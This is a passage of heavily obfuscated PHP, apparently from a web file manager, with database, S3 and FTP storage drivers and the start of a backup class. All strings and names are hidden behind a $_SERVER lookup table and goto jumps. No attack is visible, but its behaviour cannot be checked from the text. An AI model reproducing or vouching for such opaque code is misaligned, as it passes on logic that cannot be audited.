$©­»ÖªÅ; } public function getTables($š½ªæü = '') { $ù‚Ë‰Ü² =& $_SERVER[‹è™Ü¸Ñ]; $©üšò´Ÿ = $this->query($ù‚Ë‰Ü²[45] . $ù‚Ë‰Ü²[46] . $ù‚Ë‰Ü²[47]); $±ü‡™ˆ = array(); foreach ($©üšò´Ÿ as $“ø¾ô¦ => $“ÛÇ†æŞ) { $±ü‡™ˆ[$“ø¾ô¦] = current($“ÛÇ†æŞ); } return $±ü‡™ˆ; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $şñ½õ =& $_SERVER[‹è™Ü¸Ñ]; $this->error = $this->_linkID->lastErrorMsg(); if ($şñ½õ[12] != $this->queryStr) { $this->error .= LNG($şñ½õ[48]) . $this->queryStr; } think_trace($this->error, $şñ½õ[12], $şñ½õ[49]); return $this->error; } public function escapeString($²óÙÅıÄ) { $óò÷îÅÙ =& $_SERVER[‹è™Ü¸Ñ]; if ($this->_linkID) { return $this->_linkID->escapeString($²óÙÅıÄ); } return str_ireplace($óò÷îÅÙ[58], $óò÷îÅÙ[59], $²óÙÅıÄ); } public function parseLimit($Õœ¾¿±) { $ÛººÄÚÆ =& $_SERVER[‹è™Ü¸Ñ]; $şÉ“È»˜ = $ÛººÄÚÆ[12]; if (!empty($Õœ¾¿±)) { $Õœ¾¿± = explode($ÛººÄÚÆ[50], $Õœ¾¿±); if (count($Õœ¾¿±) > 1) { $şÉ“È»˜ .= $ÛººÄÚÆ[51] . $Õœ¾¿±[1] . $ÛººÄÚÆ[52] . $Õœ¾¿±[0] . $ÛººÄÚÆ[53]; } else { $şÉ“È»˜ .= $ÛººÄÚÆ[51] . $Õœ¾¿±[0] . $ÛººÄÚÆ[53]; } } return $şÉ“È»˜; } } goto fŒ¹¡©õ; EÇˆÃæÑğ–: class PathDriverEDS extends PathDriverBaseS3 { public function __construct($Ó›Û…¤) { parent::__construct($Ó›Û…¤); $this->setSignVersion($_SERVER[‹è™Ü¸Ñ][247]); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($…Íí†Ÿù) { parent::__construct($…Íí†Ÿù); $this->setSignVersion($_SERVER[‹è™Ü¸Ñ][247]); } public function uploadFormData($ï¨ô¢‹¸, $ı«ş­å = 3600) { $ÒÏ­”Éú =& $_SERVER[‹è™Ü¸Ñ]; $ó•ïŞ™ = $ÒÏ­”Éú[229]; $²Êğ„¦â = $ÒÏ­”Éú[270]; $ò¾õ¥ = $ÒÏ­”Éú[62]; $í¼äÜÚ¹ = gmdate($ÒÏ­”Éú[271]); $Õêş…˜ = gmdate($ÒÏ­”Éú[272]); $¡Ü§µ’Ş = $ÒÏ­”Éú[273]; $­Ñè¶·› = $ı«ş­å . $ÒÏ­”Éú[12]; $À£Úù„ˆ = $ÒÏ­”Éú[274]; $Ş»â¶‘ = array($this->accessKey, $Õêş…˜, $this->region, $ò¾õ¥, $¡Ü§µ’Ş); $×õÑØÆ = implode($ÒÏ­”Éú[8], $Ş»â¶‘); $“û¦«éö = array($ÒÏ­”Éú[275] => gmdate($ÒÏ­”Éú[299], strtotime($ÒÏ­”Éú[277])), $ÒÏ­”Éú[278] => array(array($ÒÏ­”Éú[279] => $this->bucket), array($ÒÏ­”Éú[280] => $ó•ïŞ™), array($ÒÏ­”Éú[281], $ÒÏ­”Éú[282], $ÒÏ­”Éú[12]), array($ÒÏ­”Éú[281], $ÒÏ­”Éú[283], $ÒÏ­”Éú[12]), array($ÒÏ­”Éú[281], $ÒÏ­”Éú[284], $ÒÏ­”Éú[12]), array($ÒÏ­”Éú[285] => $À£Úù„ˆ), array($ÒÏ­”Éú[286] => $×õÑØÆ), array($ÒÏ­”Éú[287] => $²Êğ„¦â), array($ÒÏ­”Éú[288] => $í¼äÜÚ¹), array($ÒÏ­”Éú[289] => $­Ñè¶·›))); $áĞã’À = base64_encode(json_encode($“û¦«éö)); $•¸Ä÷±° = hash_hmac($ÒÏ­”Éú[290], $Õêş…˜, $ÒÏ­”Éú[291] . $this->secret, !0); $’×à˜ = hash_hmac($ÒÏ­”Éú[290], $this->region, $•¸Ä÷±°, !0); $§úÄÙ©Ñ = hash_hmac($ÒÏ­”Éú[290], $ò¾õ¥, $’×à˜, !0); $²‰µœ¨ = hash_hmac($ÒÏ­”Éú[290], $¡Ü§µ’Ş, $§úÄÙ©Ñ, !0); $½Ç¢Â½ = hash_hmac($ÒÏ­”Éú[290], $áĞã’À, $²‰µœ¨); $îÑ¹˜¾· = array($ÒÏ­”Éú[246] => $ÒÏ­”Éú[12], $ÒÏ­”Éú[292] => $ÒÏ­”Éú[12], $ÒÏ­”Éú[280] => $ó•ïŞ™, $ÒÏ­”Éú[285] => $À£Úù„ˆ, $ÒÏ­”Éú[293] => $áĞã’À, $ÒÏ­”Éú[294] => $×õÑØÆ, $ÒÏ­”Éú[295] => $²Êğ„¦â, $ÒÏ­”Éú[296] => $í¼äÜÚ¹, $ÒÏ­”Éú[297] => $­Ñè¶·›, $ÒÏ­”Éú[298] => $½Ç¢Â½, $ÒÏ­”Éú[208] => $this->getHost()); return $îÑ¹˜¾·; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\x31"; public $config = array(); public function __construct($·Ä•ÆèÃ) { parent::__construct(); if (count($·Ä•ÆèÃ) > 0) { $this->_init($·Ä•ÆèÃ); } } public function __destruct() { if (!$this->_isconn(!1)) { return !1; } return @ftp_close($this->connect); } private function charsetReset($˜°™÷ò) { $˜Ö´Ì­’ =& $_SERVER[‹è™Ü¸Ñ]; global $config; $this->appCharset = $config[$˜Ö´Ì­’[1416]]; $this->systemCharset = $config[$˜Ö´Ì­’[1417]]; if (isset($˜°™÷ò[$˜Ö´Ì­’[1418]]) && $˜°™÷ò[$˜Ö´Ì­’[1418]]) { $this->systemCharset = $˜°™÷ò[$˜Ö´Ì­’[1418]]; } } public function iconvApp($ô“ˆó ¿) { return $this->iconvTo($ô“ˆó ¿, $this->systemCharset, $this->appCharset); } public function iconvSystem($©ÒÖ¾) { return $this->iconvTo($©ÒÖ¾, $this->appCharset, $this->systemCharset); } public function getPathOuter($™ÈÛ¤¾—) { $œ˜ç¼¨Ã =& $_SERVER[‹è™Ü¸Ñ]; $ßÛâ÷ = $this->iconvApp($this->pathBase); $™ÈÛ¤¾— = $this->iconvApp($™ÈÛ¤¾—); if (substr($ßÛâ÷, 0, 2) == $œ˜ç¼¨Ã[1390]) { $ßÛâ÷ = BASIC_PATH . substr($ßÛâ÷, 2); } if (substr($™ÈÛ¤¾—, 0, 2) == $œ˜ç¼¨Ã[1390]) { $™ÈÛ¤¾— = BASIC_PATH . substr($™ÈÛ¤¾—, 2); } $ßÛâ÷ = KodIO::clear($ßÛâ÷); $™ÈÛ¤¾— = KodIO::clear($™ÈÛ¤¾—); $™ÈÛ¤¾— = substr($™ÈÛ¤¾—, strlen($ßÛâ÷)); if (empty($this->pathDriver)) { return $™ÈÛ¤¾—; } return $this->pathDriver . $œ˜ç¼¨Ã[8] . ltrim($™ÈÛ¤¾—, $œ˜ç¼¨Ã[8]); } private function _init($£ñ¬üº­ = array()) { $±è­œÌÄ =& $_SERVER[‹è™Ü¸Ñ]; if (!function_exists($±è­œÌÄ[1419])) { throw new Exception(LNG($±è­œÌÄ[1420])); } $this->config = $£ñ¬üº­; $this->charsetReset($£ñ¬üº­); foreach ($£ñ¬üº­ as $è×ÃıŠÔ => $ÀÍ«Ãè—) { if (isset($this->{$è×ÃıŠÔ})) { $this->{$è×ÃıŠÔ} = $ÀÍ«Ãè—; } } return $this->_login($£ñ¬üº­); } private function _login($À¸§¯¯) { $áĞâùÕ =& $_SERVER[‹è™Ü¸Ñ]; static $¸›È×³¥ = array(); $åä§Îàè = md5(json_encode($À¸§¯¯)); if (isset($¸›È×³¥[$åä§Îàè])) { foreach ($¸›È×³¥[$åä§Îàè] as $Å¡æèÆ‰ => $ƒÏª’ø×) { $this->{$Å¡æèÆ‰} = $ƒÏª’ø×; } return !0; } $šê××ÁÇ = parse_url(trim($this->server, $áĞâùÕ[8])); $this->host = $šê××ÁÇ[$áĞâùÕ[208]]; $ß«×âÒĞ = isset($šê××ÁÇ[$áĞâùÕ[207]]) && $šê××ÁÇ[$áĞâùÕ[207]] == $áĞâùÕ[1421] ? !0 : !1; $this->scheme = $ß«×âÒĞ ? $áĞâùÕ[1422] : $áĞâùÕ[1423]; $this->port = isset($šê××ÁÇ[$áĞâùÕ[209]]) ? $šê××ÁÇ[$áĞâùÕ[209]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 30); if ($this->connect === !1) { $this->writeLog(LNG($áĞâùÕ[1424]) . $this->host . $áĞâùÕ[4] . $this->port, !0); return !1; } $ğÚøĞ½ = @ftp_login($this->connect, $this->username, $this->userpass); if (!$ğÚøĞ½) { $this->writeLog(LNG($áĞâùÕ[1425]) . $this->username, !0); return !1; } @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $ó£œòíÚ = $this->pasv == $áĞâùÕ[91] ? !0 : !1; @ftp_pasv($this->connect, $ó£œòíÚ); $¸›È×³¥[$åä§Îàè] = array($áĞâùÕ[1426] => $this->connect, $áĞâùÕ[208] => $this->host, $áĞâùÕ[207] => $this->scheme, $áĞâùÕ[209] => $this->port); return $ğÚøĞ½; } private function _isconn($ÊÃûÁ³³ = true) { if (is_resource($this->connect)) { return !0; } if (!$ÊÃûÁ³³) { return !1; } return $this->_login($this->config); } public function mkfile($ Í£‹‹Ã, $¤ğœîû = '', $‡â±ä±Ó = REPEAT_RENAME) { if ($this->setContent($ Í£‹‹Ã, $¤ğœîû)) { return $this->getPathOuter($ Í£‹‹Ã); } $this->writeLog(LNG($_SERVER[‹è™Ü¸Ñ][1427]), !0); return !1; } public function mkdir($ü÷š¶çÒ, $—ˆø÷è¦ = REPEAT_SKIP) { $£Å„ÁÎŒ =& $_SERVER[‹è™Ü¸Ñ]; if (!$ü÷š¶çÒ || $ü÷š¶çÒ == $£Å„ÁÎŒ[8]) { return !0; } if (!$this->_isconn()) { return !1; } $ü÷š¶çÒ = $this->iconvSystem($ü÷š¶çÒ); if ($this->_isFolder($ü÷š¶çÒ) || @ftp_mkdir($this->connect, $ü÷š¶çÒ)) { return $this->getPathOuter($ü÷š¶çÒ); } if (!$this->mkdir($this->pathFather($ü÷š¶çÒ))) { return !1; } if ($ü÷š¶çÒ = @ftp_mkdir($this->connect, $ü÷š¶çÒ)) { return $this->getPathOuter($ü÷š¶çÒ); } $this->writeLog(__FUNCTION__ . $£Å„ÁÎŒ[1428], !0); return !1; } public function copyFile($ç™¥ø», $Ê©şö¡¸) { if (!$this->_isconn()) { return !1; } $øúÖÇ«Œ = $this->pathThis($this->iconvSystem($ç™¥ø»)); $ ®ÇÃ© = $this->tempFile($øúÖÇ«Œ); $–ê¾œÆ = $this->iconvApp($ ®ÇÃ©); $this->download($ç™¥ø», $–ê¾œÆ); $®Šü‹Ê = $this->upload($Ê©şö¡¸, $–ê¾œÆ); $this->tempFileRemve($ ®ÇÃ©); return $®Šü‹Ê; } public function moveFile($³ò¾Åùğ, $±©‰ùÚä) { if (!$this->_isconn()) { return !1; } $³ò¾Åùğ = $this->iconvSystem($³ò¾Åùğ); $±©‰ùÚä = $this->iconvSystem($±©‰ùÚä); $¶­Æğ÷² = @ftp_rename($this->connect, $³ò¾Åùğ, $±©‰ùÚä); if (!$¶­Æğ÷²) { $this->writeLog(__FUNCTION__ . $_SERVER[‹è™Ü¸Ñ][1428], !0); return !1; } return $this->getPathOuter($±©‰ùÚä); } public function delFile($æöï—ö) { if (!$this->_isconn()) { return !1; } $æöï—ö = $this->iconvSystem($æöï—ö); $ï÷¼Œ = @ftp_delete($this->connect, $æöï—ö); if (!$ï÷¼Œ) { $this->writeLog(__FUNCTION__ . $_SERVER[‹è™Ü¸Ñ][1428], !0); } return $ï÷¼Œ; } public function delFolder($¼º›ºâ) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $®³óÖø = $Áà§¨¤Ó = array(); $this->fileList($¼º›ºâ, $®³óÖø, $Áà§¨¤Ó, !0); $this->listItemCache = !0; foreach ($Áà§¨¤Ó as $«„–æ‚ø) { $é›±×¶ = $this->iconvSystem($«„–æ‚ø[$_SERVER[‹è™Ü¸Ñ][32]]); $á§´Õë“ = @ftp_delete($this->connect, $é›±×¶); if (!$á§´Õë“) { return !1; } } foreach ($®³óÖø as $é›±×¶) { $é›±×¶ = $this->iconvSystem($é›±×¶); $á§´Õë“ = @ftp_rmdir($this->connect, $é›±×¶); if (!$á§´Õë“) { return !1; } } $¼º›ºâ = $this->iconvSystem($¼º›ºâ); return @ftp_rmdir($this->connect, $¼º›ºâ); } public function rename($›äö—şê, $Àï«ÊëÎ) { $ƒŒÙò¨ =& $_SERVER[‹è™Ü¸Ñ]; if (!$this->_isconn()) { return !1; } $¯êäé§è = $this->fileNameAuto($this->pathFather($›äö—şê), $Àï«ÊëÎ); $¯êäé§è = $this->iconvSystem($¯êäé§è); $›äö—şê = $this->iconvSystem($›äö—şê); $Ô®åÅ = $this->pathFather($›äö—şê); $È„ÈİÄø = rtrim($Ô®åÅ, $ƒŒÙò¨[8]) . $ƒŒÙò¨[8] . $¯êäé§è; $˜Şó¿í¦ = @ftp_rename($this->connect, $›äö—şê, $È„ÈİÄø); if (!$˜Şó¿í¦) { $this->writeLog(__FUNCTION__ . $ƒŒÙò¨[1428], !0); return !1; } $È„ÈİÄø = $this->iconvApp($È„ÈİÄø); return $this->getPathOuter($È„ÈİÄø); } private function folderInfo($Ìø·ºãÌ, $Ù¶ÙŸÁÃ = false) { $Î”“©´  =& $_SERVER[‹è™Ü¸Ñ]; $Úºüş»ò = array($Î”“©´ [32] => $this->pathThis($Ìø·ºãÌ), $Î”“©´ [87] => $this->getPathOuter($Î”“©´ [8] . $Ìø·ºãÌ), $Î”“©´ [33] => $Î”“©´ [78]); if ($Ù¶ÙŸÁÃ) { return $Úºüş»ò; } $Úºüş»ò[$Î”“©´ [231]] = $Úºüş»ò[$Î”“©´ [88]] = 0; $Úºüş»ò[$Î”“©´ [232]] = $Úºüş»ò[$Î”“©´ [233]] = !0; return $Úºüş»ò; } private function fileInfo($¸ø¡«Ù¥, $¢ß³ëÃ = false, $‘˜ÉÕúë = array()) { $´âùÂÜ =& $_SERVER[‹è™Ü¸Ñ]; $àõÑÜô = array($´âùÂÜ[32] => $this->pathThis($¸ø¡«Ù¥), $´âùÂÜ[87] => $this->getPathOuter($´âùÂÜ[8] . $¸ø¡«Ù¥), $´âùÂÜ[33] => $´âùÂÜ[230], $´âùÂÜ[79] => isset($‘˜ÉÕúë[$´âùÂÜ[79]]) ? $‘˜ÉÕúë[$´âùÂÜ[79]] : 0, $´âùÂÜ[169] => $this->ext($¸ø¡«Ù¥)); if ($¢ß³ëÃ) { return $àõÑÜô; } $àõÑÜô[$´âùÂÜ[231]] = $àõÑÜô[$´âùÂÜ[88]] = 0; $àõÑÜô[$´âùÂÜ[232]] = $àõÑÜô[$´âùÂÜ[233]] = !0; $òÜ›ÛÖ‚ = $this->iconvSystem($¸ø¡«Ù¥); $àõÑÜô[$´âùÂÜ[88]] = @ftp_mdtm($this->connect, $òÜ›ÛÖ‚); if (empty($‘˜ÉÕúë)) { $‘˜ÉÕúë = $this->objectMeta($¸ø¡«Ù¥); if (!$‘˜ÉÕúë) { return $àõÑÜô; } } $àõÑÜô[$´âùÂÜ[79]] = $‘˜ÉÕúë[$´âùÂÜ[79]]; return $àõÑÜô; } public function size($Ûñå¹ê) { $Ç¦í¢©Ò = $this->objectMeta($Ûñå¹ê); return $Ç¦í¢©Ò ? $Ç¦í¢©Ò[$_SERVER[‹è™Ü¸Ñ][79]] : 0; } public function info($¯ªÃúäæ) { if ($this->isFile($¯ªÃúäæ)) { return $this->fileInfo($¯ªÃúäæ, 0); } else { if ($this->isFolder($¯ªÃúäæ)) { return $this->folderInfo($¯ªÃúäæ); } } return !1; } private function fileList($´±½ªù, &$ĞêëÕ„…, &$œªÎó, $Ø‘Û¾·î = false) { $“Ÿæ›‚ =& $_SERVER[‹è™Ü¸Ñ]; $´±½ªù = $this->iconvSystem($´±½ªù); if (!$this->isFolder($´±½ªù)) { return !1; } @ftp_chdir($this->connect, $“Ÿæ›‚[8]); $´±½ªù = rtrim($´±½ªù, $“Ÿæ›‚[8]) . $“Ÿæ›‚[8]; check_abort(); $„ËÛÏƒ› = @ftp_rawlist($this->connect, $´±½ªù); if (!$„ËÛÏƒ›) { $„ËÛÏƒ› = array(); } $© ãµö = array($“Ÿæ›‚[10] => 1, $“Ÿæ›‚[1343] => 1); foreach ($„ËÛÏƒ› as $ñŠÍ¬¶×) { $‚øŞéø’ = $this->_listItem($ñŠÍ¬¶×); if ($‚øŞéø’[0] == $“Ÿæ›‚[813]) { continue; } $ÌÖé†ê = $‚øŞéø’[8]; if (empty($ÌÖé†ê) && $ÌÖé†ê !== $“Ÿæ›‚[228] || isset($© ãµö[$ÌÖé†ê])) { continue; } $ÌÖé†ê = $this->iconvApp($´±½ªù . ltrim($ÌÖé†ê, $“Ÿæ›‚[8])); $¾¾âĞ×© = array($“Ÿæ›‚[32] => $ÌÖé†ê, $“Ÿæ›‚[33] => $“Ÿæ›‚[230], $“Ÿæ›‚[79] => $‚øŞéø’[4]); if (substr($ñŠÍ¬¶×, 0, 1) == $“Ÿæ›‚[1429]) { $¾¾âĞ×©[$“Ÿæ›‚[33]] = $“Ÿæ›‚[78]; $¾¾âĞ×©[$“Ÿæ›‚[79]] = 0; } $»ò±ŸâÍ = $¾¾âĞ×©[$“Ÿæ›‚[33]] == $“Ÿæ›‚[78] ? !0 : !1; $this->cacheMethodInfoSet($ÌÖé†ê, $»ò±ŸâÍ, $¾¾âĞ×©); if ($»ò±ŸâÍ) { $ĞêëÕ„…[] = $ÌÖé†ê; if ($Ø‘Û¾·î) { $this->fileList($ÌÖé†ê, $ĞêëÕ„…, $œªÎó, $Ø‘Û¾·î); } continue; } $œªÎó[] = $¾¾âĞ×©; } $this->cacheMethodInfoSet($´±½ªù, !0); } private function _listItem($àşá£ÀÉ) { if (empty($àşá£ÀÉ)) { return array(); } $á¹ÕšÑ‰ = preg_split($_SERVER[‹è™Ü¸Ñ][1430], $àşá£ÀÉ); if (count($á¹ÕšÑ‰) <= 9) { return $á¹ÕšÑ‰; } $á¹ÕšÑ‰[8] = trim(substr($àşá£ÀÉ, strpos($àşá£ÀÉ, $á¹ÕšÑ‰[7]) + strlen($á¹ÕšÑ‰[7]))); return array_splice($á¹ÕšÑ‰, 0, 9); } public function listPath($¾”äÑÇ, $È•‰ÓË = false) { $úÌ«²‹õ =& $_SERVER[‹è™Ü¸Ñ]; if (!$this->_isconn()) { return !1; } $Ï»®ª³ = $½â€£íÇ = array(); $this->fileList($¾”äÑÇ, $Ï»®ª³, $½â€£íÇ); foreach ($Ï»®ª³ as $ç¸ã¬é— => $•“Ğñú) { $Ï»®ª³[$ç¸ã¬é—] = $this->folderInfo($•“Ğñú, $È•‰ÓË); } foreach ($½â€£íÇ as $ç¸ã¬é— => $•“Ğñú) { $½â€£íÇ[$ç¸ã¬é—] = $this->fileInfo($•“Ğñú[$úÌ«²‹õ[32]], $È•‰ÓË, $•“Ğñú); } return array($úÌ«²‹õ[85] => $Ï»®ª³, $úÌ«²‹õ[86] => $½â€£íÇ); } public function has($„ÈêÑ¡Ï, $Æİ‹€ß‹ = false, $ÇÌ€ÑàØ = true) { $šºŸš¨‚ =& $_SERVER[‹è™Ü¸Ñ]; $•ÂÏºÒ‚ = $Ş·µ¡«¸ = array(); $Éˆ¹¶îĞ = $Æİ‹€ß‹ ? !0 : !1; $this->fileList($„ÈêÑ¡Ï, $•ÂÏºÒ‚, $Ş·µ¡«¸, $Éˆ¹¶îĞ); if ($Æİ‹€ß‹) { return array($šºŸš¨‚[239] => count($Ş·µ¡«¸), $šºŸš¨‚[240] => count($•ÂÏºÒ‚)); } if ($ÇÌ€ÑàØ) { if (count($Ş·µ¡«¸)) { return !0; } } else { if (count($•ÂÏºÒ‚)) { return !0; } } return !1; } public function listAll($¨ñ¯ø³„) { $£õÊÈêŠ =& $_SERVER[‹è™Ü¸Ñ]; if (!$this->_isconn()) { return !1; } $ïÏ¢ñş = $¤Æ»×Ş· = array(); $this->fileList($¨ñ¯ø³„, $ïÏ¢ñş, $¤Æ»×Ş·, !0); $§ ¿ìÓß = array_to_keyvalue($¤Æ»×Ş·, $£õÊÈêŠ[32]); foreach ($ïÏ¢ñş as $ÍŸ‡¤Ò¦) { if (is_string($ÍŸ‡¤Ò¦)) { $§ ¿ìÓß[$ÍŸ‡¤Ò¦] = array($£õÊÈêŠ[79] => 0); } } return $this->listAllFiles($¨ñ¯ø³„, $§ ¿ìÓß); } public function getContent($¿èıüÁ) { if (!$this->_isconn()) { return !1; } $¿èıüÁ = $this->iconvSystem($¿èıüÁ); return $this->fileSubstr($¿èıüÁ); } public function setContent($åÃü•Ú, $î¹™¿À = '') { if (!$this->_isconn()) { return !1; } $ÔÁò€ª = $this->pathThis($this->iconvSystem($åÃü•Ú)); $·˜­ ×à = $this->tempFile($ÔÁò€ª); file_put_contents($·˜­ ×à, $î¹™¿À); $š¶¼î·Ñ = $this->upload($åÃü•Ú, $this->iconvApp($·˜­ ×à)); $this->tempFileRemve($·˜­ ×à); return $š¶¼î·Ñ; } public function fileSubstr($ÜÏ“›À, $‘Üè·ä¿ = 0, $Ü‹Ø×³ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($ÜÏ“›À, $‘Üè·ä¿, $Ü‹Ø×³); } private function ftpRequest($„Õ¾¾É‰, $íªÁ¶®É = 0, $Ş½²›¶• = false) { $„Õ¾¾É‰ = $this->iconvSystem($„Õ¾¾É‰); $µÔÔº·¿ = $this->scheme . $this->host . $_SERVER[‹è™Ü¸Ñ][4] . $this->port; $Åáö¨ÓÇ = curl_init(); curl_setopt($Åáö¨ÓÇ, CURLOPT_URL, $µÔÔº·¿ . $this->pathEncode($„Õ¾¾É‰)); curl_setopt($Åáö¨ÓÇ, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($Ş½²›¶•) { $ûÎ´¹í§ = $íªÁ¶®É + $Ş½²›¶• - 1; curl_setopt($Åáö¨ÓÇ, CURLOPT_RANGE, "{$íªÁ¶®É}\55{$ûÎ´¹í§}"); } curl_setopt($Åáö¨ÓÇ, CURLOPT_RETURNTRANSFER, 1); $¦€¹‹ö™ = curl_exec($Åáö¨ÓÇ); curl_close($Åáö¨ÓÇ); return $¦€¹‹ö™; } public function upload($õ­ó³±, $‡“œ„œ, $«˜ŸÎª§ = false, $„üáóğ = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($õ­ó³±))) { return !1; } $õ­ó³± = $this->iconvSystem($õ­ó³±); $‡“œ„œ = $this->iconvSystem($‡“œ„œ); $ë„µäáñ = ftp_nb_put($this->connect, $õ­ó³±, $‡“œ„œ, FTP_BINARY); while ($ë„µäáñ == FTP_MOREDATA) { $ë„µäáñ = ftp_nb_continue($this->connect); } if ($ë„µäáñ != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[‹è™Ü¸Ñ][1428], !0); return !1; } return $this->getPathOuter($õ­ó³±); } public function download($şĞÈùÀŒ, $¿ÕßÉ‚¶ = '') { if (!$this->_isconn()) { return !1; } $¦ó…ìË¤ = $this->pathFather($¿ÕßÉ‚¶); if (!IO::mkdir($¦ó…ìË¤)) { return !1; } $şĞÈùÀŒ = $this->iconvSystem($şĞÈùÀŒ); $¿ÕßÉ‚¶ = $this->iconvSystem($¿ÕßÉ‚¶); $Åë˜µ„“ = ftp_nb_get($this->connect, $¿ÕßÉ‚¶, $şĞÈùÀŒ, FTP_BINARY); while ($Åë˜µ„“ == FTP_MOREDATA) { $Åë˜µ„“ = ftp_nb_continue($this->connect); } if ($Åë˜µ„“ != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[‹è™Ü¸Ñ][1428], !0); return !1; } return $this->iconvApp($¿ÕßÉ‚¶); } public function exist($‡Ç¬ç¹¡) { return $this->isFile($‡Ç¬ç¹¡) || $this->isFolder($‡Ç¬ç¹¡); } public function isFile($€‰ÜŒ¬•) { return !$this->isFolder($€‰ÜŒ¬•) && $this->objectMeta($€‰ÜŒ¬•); } public function isFolder($³’çüœ¦) { return $this->cacheMethod($_SERVER[‹è™Ü¸Ñ][179], $³’çüœ¦); } protected function objectMeta($©Ê›¤¹µ) { return $this->cacheMethod($_SERVER[‹è™Ü¸Ñ][181], $©Ê›¤¹µ); } protected function _objectMeta($À‡ç¥ÔÕ) { $ç¡şÃ˜ =& $_SERVER[‹è™Ü¸Ñ]; if ($À‡ç¥ÔÕ == $ç¡şÃ˜[12] || $À‡ç¥ÔÕ == $ç¡şÃ˜[8]) { return array(); } if (!$this->_isconn()) { return !1; } $À‡ç¥ÔÕ = $this->iconvSystem($À‡ç¥ÔÕ); $ˆ€«ìæù = array($ç¡şÃ˜[32] => $this->iconvApp($À‡ç¥ÔÕ), $ç¡şÃ˜[33] => $ç¡şÃ˜[230], $ç¡şÃ˜[79] => 0); @ftp_chdir($this->connect, $ç¡şÃ˜[8]); $û‘Ø’İ£ = @ftp_size($this->connect, $À‡ç¥ÔÕ); if ($û‘Ø’İ£ != -1) { $ˆ€«ìæù[$ç¡şÃ˜[79]] = $û‘Ø’İ£; } else { $‚•ğ°¸¬ = @ftp_chdir($this->connect, $À‡ç¥ÔÕ); if (!$‚•ğ°¸¬) { return !1; } $ˆ€«ìæù[$ç¡şÃ˜[33]] = $ç¡şÃ˜[78]; } return $ˆ€«ìæù; } protected function _isFolder($„âù¦ §) { $ßù‰©Â× =& $_SERVER[‹è™Ü¸Ñ]; if ($„âù¦ § == $ßù‰©Â×[12] || $„âù¦ § == $ßù‰©Â×[8]) { return !0; } $Ã‹Çş“õ = $this->_objectMeta($„âù¦ §); return isset($Ã‹Çş“õ[$ßù‰©Â×[33]]) && $Ã‹Çş“õ[$ßù‰©Â×[33]] == $ßù‰©Â×[78] ? !0 : !1; } } goto CšÅÛÎ°«î; aŒøÃ×ï«ö: class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->model = Model($_SERVER[‹è™Ü¸Ñ][803]); $this->init(); $this->keep(); } public function init() { $‰¥†çù­ =& $_SERVER[‹è™Ü¸Ñ]; $this->isManual(); self::$name = date($‰¥†çù­[804]); if (!($å´ç’Çå = $this->model->lastItem())) { $å´ç’Çå = $this->initData(); } else { self::$name = $å´ç’Çå[$‰¥†çù­[32]]; if ($å´ç’Çå[$‰¥†çù­[805]] == $‰¥†çù­[91]) { self::$name = date($‰¥†çù­[272]); $Áˆí…Êˆ = intval(_get($å´ç’Çå, $‰¥†çù­[806], 0)); if (self::$manual == 0 && $å´ç’Çå[$‰¥†çù­[32]] == self::$name) { $this->model->remove($å´ç’Çå[$‰¥†çù­[475]]); } $å´ç’Çå = $this->initData($Áˆí…Êˆ, $å´ç’Çå[$‰¥†çù­[807]]); } else { $this->checkStore($å´ç’Çå[$‰¥†çù­[807]]); } } self::$option = $å´ç’Çå; } private function isManual() { $÷ƒ¯Ô¤Ë = _get($GLOBALS, $_SERVER[‹è™Ü¸Ñ][808], 0); $÷ƒ¯Ô¤Ë = intval($÷ƒ¯Ô¤Ë); self::$manual = $÷ƒ¯Ô¤Ë && $÷ƒ¯Ô¤Ë == 1 ? 1 : 0; } private function initData($»Ì†¾İò = 0, $á”ıÃ = '') { $ô¢§Šòó =& $_SERVER[‹è™Ü¸Ñ]; $§•Ø™ÇÔ = $this->model->config(); if ($á”ıÃ && $§•Ø™ÇÔ[$ô¢§Šòó[807]] != $á”ıÃ) { $»Ì†¾İò = 0; } $this->checkStore($§•Ø™ÇÔ[$ô¢§Šòó[807]]); if (self::$manual == 1) { self::$name .= $ô¢§Šòó[11] . date($ô¢§Šòó[809]); } $é¸ş‚€Ã = array($ô¢§Šòó[807] => $§•Ø™ÇÔ[$ô¢§Šòó[807]], $ô¢§Šòó[32] => self::$name, $ô¢§Šòó[805] => 0, $ô¢§Šòó[171] => $§•Ø™ÇÔ[$ô¢§Šòó[171]], $ô¢§Šòó[810] => self::$manual, $ô¢§Šòó[369] => array($ô¢§Šòó[811] => array($ô¢§Šòó[805] => 0), $ô¢§Šòó[812] => array($ô¢§Šòó[805] => 0, $ô¢§Šòó[813] => 0, $ô¢§Šòó[814] => 0, $ô¢§Šòó[33] => $ô¢§Šòó[12], $ô¢§Šòó[815] => 0, $ô¢§Šòó[816] => 0), $ô¢§Šòó[817] => array($ô¢§Šòó[805] => 0, $ô¢§Šòó[813] => 0, $ô¢§Šòó[814] => 0, $ô¢§Šòó[815] => 0, $ô¢§Šòó[816] => 0), $ô¢§Šòó[230] => array($ô¢§Šòó[805] => 0, $ô¢§Šòó[818] => 0, $ô¢§Šòó[819] => 0, $ô¢§Šòó[820] => 0, $ô¢§Šòó[821] => 0, $ô¢§Šòó[541] => $»Ì†¾İò, $ô¢§Šòó[815] => 0, $ô¢§Šòó[816] => 0)), $ô¢§Šòó[815] => time(), $ô¢§Šòó[816] => 0); $ª÷ºëÊŒ = $this->model->insert($é¸ş‚€Ã); $é¸ş‚€Ã[$ô¢§Šòó[475]] = $ª÷ºëÊŒ; return $é¸ş‚€Ã; } private function checkStore($ù×…ÌäŒ) { $ß¾â˜š = Model($_SERVER[‹è™Ü¸Ñ][822]); $ûÚÄ„¯« = $ß¾â˜š->listData($ù×…ÌäŒ); $ß¾â˜š->checkConfig($ûÚÄ„¯«); } public static function get() { if (!self::$option) { $…ö •ŠÙ = 